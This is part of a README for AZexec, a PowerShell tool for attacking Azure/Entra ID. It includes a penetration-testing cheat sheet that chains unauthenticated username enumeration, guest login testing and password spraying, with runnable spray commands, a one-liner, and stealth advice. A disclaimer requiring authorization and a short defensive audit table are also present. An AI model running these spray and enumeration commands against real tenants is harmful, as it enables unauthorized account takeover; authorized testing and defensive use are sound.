- **Yellow entries**: Password-only credentials (security risk)
- **Green entries**: Service principals with permissions and proper authentication
- **DarkGray entries**: Disabled service principals
- **High appRoles/delegated counts**: Potentially over-privileged service principals
- **Owners = 0**: Orphaned service principals that may be abandoned
- **Security warnings**: Automatically flagged for password-only credentials and high-risk permissions

#### Performance Considerations
- Service principal discovery involves multiple phases:
  1. Enumerate all service principals
  2. Retrieve app role assignments for all SPNs
  3. Retrieve OAuth2 permission grants for all SPNs
  4. Retrieve owners for each service principal
- For large organizations with 1000+ service principals, this can take several minutes
- The tool displays progress indicators for each phase
- Consider using `-ExportPath` to save results for offline analysis
- **Dark gray entries**: No credentials (may use managed identity)
- Security warnings at the end summarize password-only configurations

#### Large Tenant Performance
- Enumerating applications and service principals may take time in large organizations
- Service principals especially can number in the thousands (includes managed identities)
- Consider using `-ExportPath` and analyzing results offline
- JSON export provides the most detailed information for analysis
- Consider running without `-ShowOwners` first, then target specific groups

### Password Policy Enumeration Issues

#### "Failed to retrieve organization details"
- Verify you have Organization.Read.All and Directory.Read.All permissions
- Guest users typically have limited access to organizational settings
- Request appropriate permissions or use a member account

#### "Failed to check Security Defaults"
- Requires Policy.Read.All permissions
- Guest users typically **cannot** view security policies
- This is expected behavior for guest accounts
- Use a member account with appropriate permissions

#### "Failed to enumerate Conditional Access Policies"
- Requires Policy.Read.All permissions
- **Guest users are typically blocked** from viewing CA policies (by design)
- This is a **security feature** to prevent policy enumeration by external users
- Member accounts with appropriate permissions can view these policies

#### Partial Information Retrieved
- Some policy information requires elevated permissions
- Basic password policies may be visible with Organization.Read.All
- Full security posture assessment requires Policy.Read.All
- Guest users will see limited information (expected behavior)

#### "Guest users typically cannot view Conditional Access Policies"
- This is **normal and expected** behavior
- Conditional Access policies are considered sensitive security information
- Organizations properly restrict this from guest users
- If you see this message as a guest, the org has good security practices

## 📄 License

This project is licensed under the GNU General Public License v3.0 - see the [LICENSE](LICENSE) file for details.

```
Copyright (C) 2025 Logisek
https://github.com/Logisek/AZexec

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
```

## 🤝 Contributing

Contributions, issues, and feature requests are welcome!

## ⚠️ Disclaimer

This tool is provided for **legitimate security testing, research, and administrative purposes only**. 

**Important Guidelines:**

1. **Authorization Required**: Always obtain explicit written authorization before testing any Azure/Entra ID tenant that you do not own.

2. **Guest User Enumeration**: The guest user enumeration techniques demonstrated in this tool are for:
   - **Red team engagements** with proper authorization
   - **Security assessments** to test organizational defenses
   - **Educational purposes** to understand Azure security
   - **Defensive research** to improve security posture

3. **Responsible Disclosure**: If you discover vulnerabilities during authorized testing, follow responsible disclosure practices.

4. **Legal Compliance**: Ensure your activities comply with all applicable laws and regulations in your jurisdiction.

5. **Ethical Use**: Do not use this tool for unauthorized access, data theft, or any malicious activities.

**The authors assume no liability for misuse or damage caused by this tool. Users are solely responsible for ensuring proper authorization and legal compliance.**

## 👤 Author

**Logisek**
- GitHub: [@Logisek](https://github.com/Logisek)
- Project Link: [https://github.com/Logisek/AZexec](https://github.com/Logisek/AZexec)

## 🌟 Acknowledgments

- Inspired by the netexec tool
- Built with Microsoft Graph PowerShell SDK
- Guest user enumeration research inspired by years of Azure security assessments revealing this consistently overlooked vulnerability

## 📝 Quick Reference - Penetration Testing Cheat Sheet

### Reconnaissance Flow

```
┌─────────────────────────────────────────────────────────────┐
│  PHASE 1: EXTERNAL RECONNAISSANCE (No Authentication)       │
├─────────────────────────────────────────────────────────────┤
│  .\azx.ps1 tenant -Domain target.com                        │
│  .\azx.ps1 users -Domain target.com -CommonUsernames        │
│  .\azx.ps1 guest -Domain target.com  # Check B2B config     │
│                                                              │
│  Output: Tenant ID, valid usernames, federation status      │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       ↓
┌─────────────────────────────────────────────────────────────┐
│  PHASE 1b: GUEST LOGIN TESTING (Like nxc smb -u 'a' -p '') │
├─────────────────────────────────────────────────────────────┤
│  .\azx.ps1 guest -Domain target.com -UserFile users.txt \   │
│    -Password 'Summer2024!'                                   │
│                                                              │
│  Output: Valid creds, MFA status, locked accounts           │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       ↓
┌─────────────────────────────────────────────────────────────┐
│  PHASE 2: OBTAIN GUEST ACCESS (Social Engineering)          │
├─────────────────────────────────────────────────────────────┤
│  - Register as "vendor" or "consultant"                     │
│  - Compromise partner organization                          │
│  - Leaked credentials from breaches                         │
│  - Use valid creds from Phase 1b (if MFA not required)     │
│                                                              │
│  Result: guest@partner.com credentials                      │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       ↓
┌─────────────────────────────────────────────────────────────┐
│  PHASE 3: GUEST ENUMERATION (Low-Noise Reconnaissance)      │
├─────────────────────────────────────────────────────────────┤
│  .\azx.ps1 user-profiles -ExportPath users.csv             │
│  .\azx.ps1 hosts -ShowOwners -ExportPath loot.json         │
│  .\azx.ps1 groups -ExportPath groups.json                   │
│  .\azx.ps1 pass-pol -ExportPath policy.json                 │
│                                                              │
│  Detection Risk: LOW (appears as normal collaboration)      │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       ↓
┌─────────────────────────────────────────────────────────────┐
│  PHASE 4: ANALYSIS & TARGET IDENTIFICATION (Offline)        │
├─────────────────────────────────────────────────────────────┤
│  - Identify privileged accounts (admins, global admins)     │
│  - Map organizational structure                             │
│  - Find non-compliant devices                               │
│  - Locate high-value targets (executives, finance)          │
│  - Identify legacy/unpatched systems                        │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       ↓
┌─────────────────────────────────────────────────────────────┐
│  PHASE 5: TARGETED ATTACK                                   │
├─────────────────────────────────────────────────────────────┤
│  - Spear phishing campaigns                                 │
│  - Password spraying                                         │
│  - Credential stuffing                                       │
│  - Exploitation of vulnerable devices                       │
└─────────────────────────────────────────────────────────────┘
```

### Commands Cheat Sheet

| Objective | Command | Authentication | NetExec Equivalent |
|-----------|---------|----------------|--------------------|
| Discover tenant | `.\azx.ps1 tenant -Domain target.com` | ❌ None | `nxc smb --enum` |
| Validate usernames | `.\azx.ps1 users -Domain target.com -CommonUsernames` | ❌ None | `nxc smb --users` (unauthenticated) |
| **Enumerate domain users** | `.\azx.ps1 user-profiles -ExportPath users.csv` | ✅ Guest/Member | **`nxc smb/ldap <target> -u <user> -p <pass> --users`** |
| **Enumerate user profiles (RID brute)** | `.\azx.ps1 rid-brute -ExportPath users.csv` | ✅ Guest/Member | `nxc smb --rid-brute` |
| **Test null login** | `.\azx.ps1 guest -Domain target.com -Username user -Password ''` | ❌ None | **`nxc smb -u 'a' -p ''`** |
| **Password spray** | `.\azx.ps1 guest -Domain target.com -UserFile users.txt -Password 'Pass123'` | ❌ None | `nxc smb -u users.txt -p 'Pass123'` |
| **Username enum + spray** | See [Complete Password Spray Attack](#complete-password-spray-attack-workflow) | ❌ None | `nxc smb -u users.txt -p 'Pass123'` |
| **Guest vuln scan** | `.\azx.ps1 guest-vuln-scan -ExportPath report.json` | ⚡ Hybrid | `nxc smb --check-null-session` |
| Enumerate devices | `.\azx.ps1 hosts` (login with guest creds) | ✅ Guest | `nxc smb --hosts` |
| Enumerate groups | `.\azx.ps1 groups` | ✅ Guest/Member | `nxc smb --groups` |
| Password policies | `.\azx.ps1 pass-pol` | ✅ Guest/Member | `nxc smb --pass-pol` |
| **Enumerate roles** | `.\azx.ps1 roles -ExportPath roles.csv` | ✅ Member | - |
| **Review CA policies** | `.\azx.ps1 ca-policies -ExportPath policies.json` | ✅ Member | - |
| Full device enum | `.\azx.ps1 hosts -ShowOwners -ExportPath out.json` | ✅ Guest/Member | - |
| Test guest perms | `Get-MgUser -Top 10` (after connecting) | ✅ Guest | - |
| Enumerate all users | `.\azx.ps1 user-profiles` | ✅ Guest/Member | - |
| **Enum VM logged-on users** | `.\azx.ps1 vm-loggedon` | ✅ Azure RBAC | `nxc smb --logged-on-users` |
| **Enum Storage Accounts** | `.\azx.ps1 storage-enum` | ✅ Azure RBAC | - |
| **Enum Key Vaults** | `.\azx.ps1 keyvault-enum` | ✅ Azure RBAC | - |
| **Enum Network resources** | `.\azx.ps1 network-enum` | ✅ Azure RBAC | - |
| **Show available commands** | `.\azx.ps1 help` | ❌ None | `nxc --help` |

**Tip**: Add `-Disconnect` to any authenticated command to automatically disconnect from Microsoft Graph after execution:
```powershell
.\azx.ps1 hosts -ExportPath devices.csv -Disconnect
.\azx.ps1 sp-discovery -ExportPath sp.json -Disconnect
```

**ARM Commands (Multi-Subscription)**: These commands automatically enumerate all accessible Azure subscriptions:
```powershell
.\azx.ps1 storage-enum                                  # All storage accounts across all subscriptions
.\azx.ps1 keyvault-enum -SubscriptionId "12345..."      # Key vaults in specific subscription
.\azx.ps1 network-enum -ResourceGroup Prod-RG           # Network resources in specific resource group
```

### Defensive Audit Commands

| Check | Command | What to Look For |
|-------|---------|------------------|
| Guest user settings | `Get-MgPolicyAuthorizationPolicy \| Select -ExpandProperty GuestUserRoleId` | Should be `2af84b1e-32c8-42b7-82bc-daa82404023b` (most restrictive) |
| List all guests | `Get-MgUser -Filter "userType eq 'Guest'" \| ft DisplayName,UserPrincipalName` | Review and remove unnecessary guests |
| Guest API activity | Check Azure AD Audit Logs → Filter by guest users and Microsoft Graph | Look for unusual enumeration patterns |
| Guest sign-ins | Check Azure AD Sign-in Logs → Filter by guest users | Monitor for suspicious login locations/times |

### Complete Password Spray Attack Workflow

AZexec provides a two-phase approach to password spraying that mimics NetExec's workflow:

**Phase 1: Username Enumeration (GetCredentialType API)**
```powershell
# Enumerate valid usernames using GetCredentialType API (no authentication required)
.\azx.ps1 users -Domain target.com -CommonUsernames -ExportPath valid-users.csv
```

**Phase 2: Password Spraying (ROPC Authentication)**
```powershell
# Extract just the valid usernames from CSV
$validUsers = Import-Csv valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username

# Create a username file for spraying
$validUsers | Out-File -FilePath validated-users.txt

# Perform password spray with a single password
.\azx.ps1 guest -Domain target.com -UserFile validated-users.txt -Password 'Summer2024!' -ExportPath spray-results.json
```

**One-Liner Workflow:**
```powershell
# Quick spray with common usernames
.\azx.ps1 users -Domain target.com -CommonUsernames -ExportPath valid.csv; $validUsers = (Import-Csv valid.csv | Where-Object { $_.Exists -eq 'True' }).Username | Out-File temp-users.txt; .\azx.ps1 guest -Domain target.com -UserFile temp-users.txt -Password 'Winter2024!' -ExportPath spray.json; Remove-Item temp-users.txt
```

**Why Two Separate Commands?**

The GetCredentialType API (used by `users` command) only validates username existence - it doesn't test passwords. This is by design:
- **Phase 1 (`users`)**: Uses Microsoft's public GetCredentialType endpoint to check if usernames exist
- **Phase 2 (`guest`)**: Uses ROPC (Resource Owner Password Credentials) OAuth2 flow to test actual authentication

This separation provides several benefits:
1. **Stealth**: Username enumeration doesn't trigger authentication logs
2. **Efficiency**: Only spray against validated usernames (avoid account lockouts on non-existent users)
3. **Flexibility**: Use different password lists or techniques between phases
4. **Safety**: Validate targets before attempting authentication (reduces noise and lockout risk)

**NetExec Equivalent:**
```bash
# Traditional NetExec workflow
nxc smb 192.168.1.0/24 --users          # Enumerate users
nxc smb 192.168.1.0/24 -u users.txt -p 'Password123'  # Password spray

# AZexec equivalent
.\azx.ps1 users -Domain target.com -CommonUsernames -ExportPath users.csv
.\azx.ps1 guest -Domain target.com -UserFile users.txt -Password 'Password123'
```

---

**Note**: This tool requires PowerShell 7+ and appropriate Azure/Entra ID permissions. Always ensure you have proper authorization before conducting any enumeration activities.
